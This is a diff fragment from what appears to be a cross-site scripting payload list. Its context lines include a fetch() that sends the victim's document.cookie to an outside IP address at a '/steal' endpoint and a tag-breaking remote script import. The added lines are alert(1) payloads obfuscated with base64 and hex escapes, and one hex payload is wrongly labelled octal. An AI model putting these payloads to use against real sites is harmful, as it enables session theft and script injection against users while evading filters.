@@ -20,3 +20,10 @@ fetch('http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie));
 
 "/><script>import('//localserver/xss.js')</script>
 
+eval(atob("YWxlcnQoMSk=")) # // → runs alert(1) (BASE64)
+
+<img src=1 onerror="eval('\x61\x6c\x65\x72\x74(1)')">
+
+eval("\x61\x6c\x65\x72\x74(1)");  #// Hex for "alert(1)" # OCTAL
+
+
